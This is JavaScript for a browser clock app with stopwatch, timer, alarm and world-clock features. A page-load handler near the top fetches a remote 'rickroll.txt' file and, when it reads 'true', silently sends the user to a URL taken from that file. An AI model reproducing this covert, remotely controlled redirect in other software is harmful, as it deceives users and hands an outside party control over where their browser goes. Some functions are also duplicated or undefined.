	        const clockView = document.getElementById('clockView');
	        const analogClock = document.getElementById('analogClock');
	        const digitalClock = document.getElementById('digitalClock');
	        const stopwatchDisplay = document.getElementById('stopwatchDisplay');
	        const resetStopwatchBtn = document.getElementById('resetStopwatch');
	        const timerDisplay = document.getElementById('timerDisplay');
	        const startTimerBtn = document.getElementById('startTimer');
	        const resetTimerBtn = document.getElementById('resetTimer');
	        const alarmTimeInput = document.getElementById('alarmTimeInput');
	        const setAlarmBtn = document.getElementById('setAlarm');
	        const nextAlarmDisplay = document.getElementById('nextAlarm');
	        const timezoneSelect = document.getElementById('timezone');
	        const worldTimeDisplay = document.getElementById('worldTime');
	        
	        // Update date display
	        function updateDate() {
	            const now = new Date();
	            const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
	            document.getElementById('dateDisplay').textContent = now.toLocaleDateString('en-US', options);
	        }
	        
	        document.addEventListener("DOMContentLoaded", function() {
	    fetch('https://raw.githubusercontent.com/eselagas/main/refs/heads/main/rickroll.txt')
	        .then(response => response.text())
	        .then(data => {
	            const [status, ...urlParts] = data.split(':');
	            if (status.trim() == 'true') {
	            	const url = urlParts.join(':').trim() + '&autoplay=1';
	            	console.log('Rick-Rolling user...');
	                window.location.href = url;
	            } else {return;}
	        })
	        .catch(error => console.error('Error fetching the file:', error));
	});

	        // Enhance clock update function
	        function updateClock() {
	            const now = new Date();
	            let hours = now.getHours();
	            const minutes = String(now.getMinutes()).padStart(2, '0');
	            const seconds = now.getSeconds();
	            const milliseconds = now.getMilliseconds();

	            // Convert to 12-hour format
	            const ampm = hours >= 12 ? 'PM' : 'AM';
	            hours = hours % 12;
	            hours = hours ? hours : 12;
	            const hourString = String(hours).padStart(2, '0');

	            digitalClock.textContent = `${hourString}:${minutes} ${ampm}`;

	            // Calculate precise angles including milliseconds for smooth movement
	            const hourDeg = (hours % 12) * 30 + minutes * 0.5;
	            const minuteDeg = minutes * 6 + (seconds / 60) * 6;
	            const secondDeg = (seconds + milliseconds / 1000) * 6;

	            document.getElementById('hourHand').style.transform = `rotate(${(hourDeg + 90)}deg)`;
	            document.getElementById('minuteHand').style.transform = `rotate(${(minuteDeg + 90)}deg)`;
	            document.getElementById('secondHand').style.transform = `rotate(${(secondDeg + 90)}deg)`;

	            updateDate();
	        }

	        // Initialize markers with smoother animation
	        function createClockMarkers() {
	    for (let i = 0; i < 60; i++) {
	        const marker = document.createElement('div');
	        if (i % 5 === 0) {
	            marker.className = 'marker';
	        } else {
	            marker.className = 'sub-marker';
	            marker.style.height = '2%';
	        }
	        marker.style.transform = `rotate(${i * 6}deg)`;
	        marker.style.opacity = '0';
	        analogClock.appendChild(marker);

	        setTimeout(() => {
	            marker.style.opacity = '1';
	        }, i * 20);
	    }
	}
	        
	        // Simplified Stopwatch Logic
			let stopwatchInterval;
			let stopwatchTime = 0;
			let isStopwatchRunning = false;

			function updateStopwatchDisplay() {
			    const hours = Math.floor(stopwatchTime / 36000);
			    const minutes = Math.floor((stopwatchTime % 36000) / 600);
			    const seconds = Math.floor((stopwatchTime % 600) / 10);
			    const milliseconds = stopwatchTime % 10;
			    
			    stopwatchDisplay.textContent = 
			        `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}.${milliseconds}`;
			}

			function startStopwatchBtn() {
			    const startStopBtn = document.getElementById('startStopwatch');
			    
			    if (!isStopwatchRunning) {
			        startStopBtn.textContent = 'Stop';
			        isStopwatchRunning = true;
			        stopwatchInterval = setInterval(() => {
			            stopwatchTime++;
			            updateStopwatchDisplay();
			        }, 100);
			    } else {
			        startStopBtn.textContent = 'Start';
			        isStopwatchRunning = false;
			        clearInterval(stopwatchInterval);
			    }
			}

			// Simplified State Management
			function saveState(key, state) {
			    localStorage.setItem(key, JSON.stringify({
			        ...state,
			        timestamp: Date.now()
			    }));
			}

			function loadState(key) {
			    const savedState = localStorage.getItem(key);
			    return savedState ? JSON.parse(savedState) : null;
			}

			function loadStopwatchState() {
			    const state = loadState('stopwatchState');
			    if (!state) return;

			    const elapsedTime = Math.floor((Date.now() - state.timestamp) / 100);
			    stopwatchTime = state.isRunning ? state.time + elapsedTime : state.time;
			    
			    updateStopwatchDisplay();
			    
			    if (state.isRunning) {
			        setTimeout(() => {
			            startStopwatchBtn();
			            if (!isViewVisible('stopwatch')) {
			                showNotification('stopwatch', `Stopwatch Running: ${formatStopwatchTime(stopwatchTime)}`);
			            }
			        }, 0);
			    } else if (stopwatchTime > 0) {
			        showNotification('stopwatch', `Stopwatch Paused: ${formatStopwatchTime(stopwatchTime)}`);
			    }
			}

			// Simplified View Management
			function isViewVisible(viewId) {
			    return document.getElementById(viewId).style.display === 'block';
			}

			function showView(viewId) {
			    const views = ['clockView', 'stopwatch', 'timer', 'alarm', 'worldClock'];
			    views.forEach(view => {
			        document.getElementById(view).style.display = view === viewId ? 'block' : 'none';
			    });
			    
			    // Update notifications for hidden active features
			    if (viewId !== 'stopwatch' && isStopwatchRunning) {
			        showNotification('stopwatch', `Running: ${formatStopwatchTime(stopwatchTime)}`);
			    }
			    if (viewId !== 'timer' && isTimerRunning) {
			        showNotification('timer', `Running: ${formatTime(timerTime)}`);
			    }
			}
			
		    document.getElementById('startStopwatch').addEventListener('click', handleStopwatchClick);
	        document.getElementById('setAlarm').addEventListener('click', setAlarm);
	        let alarmGo = true;

			// Simplified Timer Logic
			let timerTime = 0;
			let timerInterval;
			let isTimerRunning = false;

			function showTimerModal() {
			    document.getElementById('timerModal').style.display = 'flex';
			}

			function closeTimerModal() {
			    document.getElementById('timerModal').style.display = 'none';
			}

			function updateTimerDisplay() {
					    const hours = Math.floor(timerTime / 3600);
					    const minutes = Math.floor((timerTime % 3600) / 60);
					    const seconds = timerTime % 60;
					    
					    timerDisplay.textContent = 
					        `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
					}

			function adjustTime(unit, value) {
			    const input = document.getElementById(`${unit}Input`);
			    let currentValue = parseInt(input.value) || 0;
			    
			    if (unit === 'hours') {
			        currentValue = Math.min(Math.max(currentValue + value, 0), 99);
			    } else {
			        currentValue = Math.min(Math.max(currentValue + value, 0), 59);
			    }
			    
			    input.value = currentValue;
			}

			function handleTimer() {
			    const setTimerBtn = document.getElementById('setTimerBtn');
			    
			    if (!isTimerRunning) {
			        if (timerTime === 0) {
			            // Show modal to set new timer
			            showTimerModal();
			        } else {
			            // Start existing timer
			            startTimer();
			            setTimerBtn.textContent = 'Stop';
			        }
			    } else {
			        // Stop timer
			        clearInterval(timerInterval);
			        isTimerRunning = false;
			        setTimerBtn.textContent = 'Start';
			    }
			}

			function startTimer() {
			    const setTimerBtn = document.getElementById('setTimerBtn');
			    setTimerBtn.textContent = 'Stop';
			    isTimerRunning = true;
			    const alarmSound = new Audio('https://github.com/eselagas/main/raw/refs/heads/main/clock-alarm-8761.mp3');
			    
			    timerInterval = setInterval(() => {
			        if (timerTime > 0) {
			            timerTime--;
			            updateTimerDisplay();
			            saveTimerState();
			        } else {
			            alarmSound.play();
			            showNotification('timer', 'Timer finished!');
			            resetTimer();
			        }
			    }, 1000);
			}

			function setTimer() {
			    const hours = parseInt(document.getElementById('hoursInput').value) || 0;
			    const minutes = parseInt(document.getElementById('minutesInput').value) || 0;
			    const seconds = parseInt(document.getElementById('secondsInput').value) || 0;
			    
			    timerTime = hours * 3600 + minutes * 60 + seconds;
			    
			    if (timerTime <= 0) {
			        alert('Please set a valid time');
			        return;
			    }

			    updateTimerDisplay();
			    closeTimerModal();
			    startTimer();
			    saveTimerState();
			}

			function resetTimer() {
			    const setTimerBtn = document.getElementById('setTimerBtn');
			    if (isTimerRunning) {
			        clearInterval(timerInterval);
			        isTimerRunning = false;
			    }
			    timerTime = 0;
			    updateTimerDisplay();
			    setTimerBtn.textContent = 'Set Timer';
			    localStorage.removeItem('timerState');
			}

			// Simplified Alarm Logic
			
			const ALARM_SOUNDS = {
			    default: 'https://github.com/eselagas/main/raw/refs/heads/main/clock-alarm-8761.mp3',
			    stardrop: 'https://github.com/eselagas/main/raw/refs/heads/main/0123.MP3',
			    lucidity: 'https://github.com/eselagas/main/raw/refs/heads/main/oversimplified-alarm-clock-113180.mp3',
			    dreamscape: 'https://github.com/eselagas/main/raw/refs/heads/main/dreamscape-alarm-clock-117680.mp3'
			};
			
			const alarmSetupModal = document.getElementById('alarmSetupModal');
			const alarmModal = document.getElementById('alarmModal');
			const alarmRingingModal = document.getElementById('alarmRingingModal');
			const saveAlarmBtn = document.getElementById('saveAlarmBtn');
			const cancelAlarmBtn = document.getElementById('cancelAlarmBtn');
			const alarmTitleInput = document.getElementById('alarmTitleInput');
			const alarmSoundSelect = document.getElementById('alarmSoundSelect');
			const repeatAlarmCheckbox = document.getElementById('repeatAlarmCheckbox');
			const customSoundUpload = document.getElementById('customSoundUpload');
			const uploadSoundBtn = document.getElementById('uploadSoundBtn');
			let alarmTimeout;
			let currentAlarmSound;
			
			setAlarmBtn.addEventListener('click', () => {
				alarmModal.style.display = 'flex';
			    alarmSetupModal.style.display = 'flex';
			});

			cancelAlarmBtn.addEventListener('click', () => {
			    alarmSetupModal.style.display = 'none';
			    alarmModal.style.display = 'none';
			});

			uploadSoundBtn.addEventListener('click', () => {
			    customSoundUpload.click();
			});

			customSoundUpload.addEventListener('change', (event) => {
			    const file = event.target.files[0];
			    if (file) {
			        const customSoundUrl = URL.createObjectURL(file);
			        ALARM_SOUNDS.custom = customSoundUrl;
			        alarmSoundSelect.value = '';
			        uploadSoundBtn.textContent = 'File Uploaded';
			    }
			});

			function formatTimeUntilAlarm(targetTime) {
		    const now = new Date();
		    const timeDiff = targetTime.getTime() - now.getTime();
		    
		    if (timeDiff <= 0 || isNaN(timeDiff)) {
		        return "No alarm set";
		    }
		    
		    const hours = Math.floor(timeDiff / (1000 * 60 * 60));
		    const minutes = Math.floor((timeDiff % (1000 * 60 * 60)) / (1000 * 60));
		    
		    const targetHours = targetTime.getHours();
		    const targetMinutes = targetTime.getMinutes();
		    
		    const ampm = targetHours >= 12 ? 'PM' : 'AM';
		    const formattedHours = targetHours % 12 || 12;
		    const formattedMinutes = targetMinutes < 10 ? '0' + targetMinutes : targetMinutes;
		    
		    if (hours > 0) {
		        return `Alarm in ${hours}h and ${minutes + 1}m`;
		    }
		    return `${minutes + 1}m to alarm`;
		}

			saveAlarmBtn.addEventListener('click', () => {
			    const alarmTime = alarmTimeInput.value;
			    if (!alarmTime) return;

			    const [hours, minutes] = alarmTime.split(':');
			    const now = new Date();
			    const alarm = new Date();
			    alarm.setHours(parseInt(hours));
			    alarm.setMinutes(parseInt(minutes));
			    alarm.setSeconds(0);
			    alarm.setMilliseconds(0);
			    
			    // If alarm time is in the past, add 24 hours
			    if (alarm < now) {
			        alarm.setDate(alarm.getDate() + 1);
			    }

			    clearTimeout(alarmTimeout);
			    
			    const alarmState = {
			        targetTime: alarm.getTime(),
			        time: alarmTime,
			        title: alarmTitleInput.value || 'Alarm',
			        sound: alarmSoundSelect.value,
			        repeat: repeatAlarmCheckbox.checked
			    };
			    
			    saveState('alarmState', alarmState);
			    updateAlarmDisplay(alarm);
			    
			    alarmTimeout = setTimeout(() => {
			        triggerAlarm(alarmState);
			    }, alarm - now);

			    alarmSetupModal.style.display = 'none';
			    alarmModal.style.display = 'none';
			});

			function triggerAlarm(alarmState) {
			    const ringingTitle = document.getElementById('alarmRingingTitle');
			    ringingTitle.textContent = alarmState.title;

			    currentAlarmSound = new Audio(ALARM_SOUNDS[alarmState.sound] || ALARM_SOUNDS.default);
			    currentAlarmSound.loop = alarmState.repeat;
			    currentAlarmSound.play();

			    alarmModal.style.display = 'flex';
			    alarmRingingModal.style.display = 'block';
			}

			// Stop Alarm
			stopAlarmBtn.addEventListener('click', () => {
			    if (currentAlarmSound) {
			        currentAlarmSound.pause();
			        currentAlarmSound.currentTime = 0;
			    }
			    
			    alarmRingingModal.style.display = 'none';
			    alarmModal.style.display = 'none';
			    
			    const state = loadState('alarmState');
			    if (state && !state.repeat) {
			        localStorage.removeItem('alarmState');
			        nextAlarmDisplay.textContent = 'No alarm set';
			    }
			});
		
		function loadAlarmState() {
	    const state = loadState('alarmState');
	    if (!state || !state.targetTime) return;
	    const now = Date.now();
	    const targetTime = new Date(state.targetTime);
	    
	    if (targetTime > now) {
	        updateAlarmDisplay(targetTime);
	        
	        alarmTimeout = setTimeout(() => {
	            const alarmSound = new Audio('https://github.com/eselagas/main/raw/refs/heads/main/clock-alarm-8761.mp3');
	            alarmSound.play();
	            showNotification('alarm', 'Alarm ringing!');
	            nextAlarmDisplay.textContent = 'No alarm set';
	            localStorage.removeItem('alarmState');
	        }, targetTime - now);
	    } else {
	        localStorage.removeItem('alarmState');
	    }
	}

		function updateAlarmDisplay(targetDate) {
    if (!(targetDate instanceof Date) || isNaN(targetDate)) {
        nextAlarmDisplay.textContent = 'No alarm set';
        return;
    }
		
	    const timeString = targetDate.toLocaleTimeString('en-US', {
	        hour: '2-digit',
	        minute: '2-digit',
	        hour12: true
	    });
	    
	    const timeUntil = formatTimeUntilAlarm(targetDate);
	    nextAlarmDisplay.textContent = `Alarm set for ${timeString}`;
	    
	    if (!isViewVisible('alarm')) {
	        showNotification('alarm', `Alarm set for ${timeString} - ${timeUntil}`);
	    }
	    
	}

			// State Management for Alarm
			function loadAlarmState() {
			    const state = loadState('alarmState');
			    if (!state || !state.targetTime) {
			        return;
			    }
			    const now = Date.now();
			    const targetTime = new Date(state.targetTime);
			    if (isNaN(targetTime) || targetTime <= now) {
			        localStorage.removeItem('alarmState');
			        return;
			    }
			    
			    updateAlarmDisplay(targetTime);
			    
			    alarmTimeout = setTimeout(() => {
			        const alarmSound = new Audio('https://github.com/eselagas/main/raw/refs/heads/main/clock-alarm-8761.mp3');
			        alarmSound.play();
			        showNotification('alarm', 'Alarm ringing!');
			        nextAlarmDisplay.textContent = 'No alarm set';
			        localStorage.removeItem('alarmState');
			    }, targetTime - now);
			}

			// Regular updates for alarm countdown
			setInterval(() => {
			    const state = loadState('alarmState');
			    if (state) {
			        const targetTime = new Date(state.targetTime);
			        if (targetTime > new Date()) {
			            updateAlarmDisplay(targetTime);
			        }
			    }
			}, 60000); // Update every minute

			// Timer State Management
			function saveTimerState() {
			    if (timerTime > 0) {
			        saveState('timerState', {
			            remainingTime: timerTime,
			            isRunning: isTimerRunning
			        });
			    } else {
			        localStorage.removeItem('timerState');
			    }
			}
	        
	        // World Clock functionality
	        function updateWorldClock() {
	            try {
	                const timezone = timezoneSelect.value;
	                const options = {
	                    timeZone: timezone,
	                    hour: '2-digit',
	                    minute: '2-digit',
	                    second: '2-digit',
	                    hour12: true
	                };
	                worldTimeDisplay.textContent = new Date().toLocaleTimeString('en-US', options);
	            } catch (error) {
	                worldTimeDisplay.textContent = "Couldn't load time";
	            }
	        }
	        

	        // Notification handling
	        let activeNotifications = {};

			function showNotification(type, message) {
		    const banner = document.querySelector(`.notification-banner.${type}`);
		    const messageElement = banner.querySelector('.message');


		    if (type !== 'alarm') {
		        activeNotifications[type] = {
		            element: messageElement,
		            updateFunction: () => {
		                if (type === 'stopwatch' && isStopwatchRunning) {
		                    return `Stopwatch Running: ${formatStopwatchTime(stopwatchTime)}`;
		                } else if (type === 'timer' && isTimerRunning) {
		                    return `Timer Running: ${formatTime(timerTime)} remaining`;
		                }
		                return message;
		            }
		        };

		        banner.classList.remove('show');
		        void banner.offsetWidth;
		        banner.classList.add('show');
		        
		        setTimeout(() => {
		            banner.classList.remove('show');
		            delete activeNotifications[type];
		        }, 5000);
		    } else {
	            messageElement.textContent = message;
	            banner.classList.add('show');
	            setTimeout(() => {
		            banner.classList.remove('show');
		        }, 5000);
	        }
		}
		
		// Update active notifications
		setInterval(() => {
		    Object.entries(activeNotifications).forEach(([type, data]) => {
		        const newMessage = data.updateFunction();
		        if (newMessage) {
		            data.element.textContent = newMessage;
		        }
		    });
		}, 100);


			function loadTimerState() {
			    try {
			        const state = loadState('timerState');
			        if (state) {
			            const currentTime = new Date().getTime();
			            const elapsedSeconds = Math.floor((currentTime - state.timestamp) / 1000);
			            const setTimerBtn = document.getElementById('setTimerBtn');
			            
			            if (state.isRunning) {
			                timerTime = Math.max(0, state.remainingTime - elapsedSeconds);
			                if (timerTime > 0) {
			                    updateTimerDisplay();
			                    setTimeout(() => {
			                        startTimer();
			                        if (document.getElementById('timer').style.display !== 'block') {
			                            showNotification('timer', `Timer running: ${formatTime(timerTime)} remaining`);
			                        }
			                    }, 0);
			                }
			            } else {
			                timerTime = state.remainingTime;
			                updateTimerDisplay();
			                if (timerTime > 0) {
			                    setTimerBtn.textContent = 'Start';
			                    showNotification('timer', `Timer paused: ${formatTime(timerTime)} remaining`);
			                }
			            }
			        }
			    } catch (error) {
			        console.error('Error loading timer state:', error);
			    }
			}
			
			function saveStopwatchState() {
			    if (stopwatchTime > 0 || isStopwatchRunning) {
			        saveState('stopwatchState', {
			            time: stopwatchTime,
			            isRunning: isStopwatchRunning
			        });
			    }
			}

			// Stopwatch state management
			function saveAlarmState(targetTime) {
			if (targetTime) {
			    saveState('alarmState', {
			        target: targetTime.getTime(),
			        startTime: Date.now()
			    });
			}
			}

			// Auto-save state periodically
			function startAutoSave() {
			    setInterval(() => {
			        if (isTimerRunning || timerTime > 0) saveTimerState();
			        if (isStopwatchRunning || stopwatchTime > 0) saveStopwatchState();
			    }, 10000); // Save every 10 seconds
			}

			// Clear states when reset
			function clearTimerState() {
			    localStorage.removeItem('timerState');
			    timerTime = 0;
			    isTimerRunning = false;
			    updateTimerDisplay();
			}

			function clearStopwatchState() {
			    localStorage.removeItem('stopwatchState');
			    stopwatchTime = 0;
			    isStopwatchRunning = false;
			    updateStopwatchDisplay();
			}

			// Update the reset button event listeners
			resetTimerBtn.addEventListener('click', function() {
			    if (isTimerRunning) {
			        startTimerBtn.click();
			    }
			    clearTimerState();
			});

			resetStopwatchBtn.addEventListener('click', function() {
			    if (isStopwatchRunning) {
			        startStopwatchBtn();
			    }
			    clearStopwatchState();
			});

			// Save state before unload
			window.addEventListener('beforeunload', () => {
			    if (isTimerRunning || timerTime > 0) saveTimerState();
			    if (isStopwatchRunning || stopwatchTime > 0) saveStopwatchState();
			});

	        // Utility functions
	        function formatTime(seconds) {
	            const h = Math.floor(seconds / 3600);
	            const m = Math.floor((seconds % 3600) / 60);
	            const s = seconds % 60;
	            return `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
	        }

	        function formatStopwatchTime(time) {
	            const h = Math.floor(time / 36000);
	            const m = Math.floor((time % 36000) / 600);
	            const s = Math.floor((time % 600) / 10);
	            const ms = time % 10;
	            return `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}.${ms}`;
	        }

	        function formatAlarmTime(timeString) {
	            const [hours, minutes] = timeString.split(':');
	            return `${hours}:${minutes}`;
	        }

	        // Alarm modal functions
	        function openAlarmModal() {
	            document.getElementById('alarmModal').style.display = 'flex';
	        }

	        function closeAlarmModal() {
	            document.getElementById('alarmModal').style.display = 'none';
	        }

	        function setAlarmFromModal() {
	            const hours = document.getElementById('alarmHours').value;
	            const minutes = document.getElementById('alarmMinutes').value;
	            alarmTimeInput.value = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}`;
	            setAlarmBtn.click();
	            closeAlarmModal();
	        }
	        
	        function handleStopwatchClick() {
		    const state = loadState('stopwatchState');
		    if (state && !isStopwatchRunning && ((Date.now() - state.timestamp) > 300000)) {
		        stopwatchTime = state.time;
		        updateStopwatchDisplay();
		    }
		    startStopwatchBtn();
		}

			function handleTimerClick() {
			    const state = loadState('timerState');
			    if (state && !isTimerRunning && ((Date.now() - state.timestamp) > 300000)) {
			        timerTime = state.remainingTime;
			        updateTimerDisplay();
			    }
			    handleTimer();
			}


		const originalShowView = showView;
		window.showView = function(viewId) {
	    return function() {
	        const visibleElement = document.querySelector('.feature-container[style*="display: block"], #clockView[style*="display: block"]');
	        const previousView = visibleElement ? visibleElement.id : null;
	        
	        originalShowView(viewId)();
	        
	        // Only show notification if there was a previous view
	        if (previousView) {
	        updateView(previousView);
	        
	            function updateView(info) {
	    switch (info) {
	        case 'timer':
	            if (timerTime > 0) {
	                showNotification('timer', `Timer Paused: ${formatTime(timerTime)} remaining`);
	            }
	            break;
	        case 'stopwatch':
	            if (stopwatchTime > 0) {
	                showNotification('stopwatch', `Stopwatch Paused: ${formatStopwatchTime(stopwatchTime)}`);
	            }
	            break;
	        case 'alarm':
	            const alarmState = loadState('alarmState');
	            if (alarmState && alarmState.targetTime) {
	                const targetDate = new Date(alarmState.targetTime);
	                if (!isNaN(targetDate) && targetDate > new Date()) {
	                    const timeString = targetDate.toLocaleTimeString('en-US', {
	                        hour: '2-digit',
	                        minute: '2-digit',
	                        hour12: true
	                    });
	                    const timeUntil = formatTimeUntilAlarm(targetDate);
	                    showNotification('alarm', `Alarm set for ${timeString} - ${timeUntil}`);
	                }
	            }
	            break;
	    }
	}

	        }
	    };
	};
	        
	        /*Viewing*/
	         function hideAllViews() {
	            const views = ['clockView', 'stopwatch', 'timer', 'alarm', 'worldClock'];
	            views.forEach(view => {
	                document.getElementById(view).style.display = 'none';
	            });
	        }
	        
	        function activateMenuItem(clickedItem) {
		    const menuItems = document.querySelectorAll('.menuItem');
		    menuItems.forEach(item => item.classList.remove('active'));
		    clickedItem.classList.add('active');
			}
			
	        function showView(viewId) {
	        return function() {
	        hideAllViews();
	        document.getElementById(viewId).style.display = 'block';   
	    };
	}

		function log(message) { let i = 1; console.log(`Log ${i}: ${message}`); i++; }
	        
	        window.showClock = showView('clockView');
	        window.showStopwatch = showView('stopwatch');
	        window.showTimer = showView('timer');
	        window.showAlarm = showView('alarm');
	        window.showWorldClock = showView('worldClock');
	        
	        updateFavicon();
	        setInterval(updateFavicon, 1000);
	        
	        updateWorldClock();
	        showClock();
	        createClockMarkers();
	        updateClock();
			setInterval(updateClock, 16.67);
	        setInterval(updateWorldClock, 1000);
	        loadTimerState();
	        loadStopwatchState();
	        loadAlarmState();
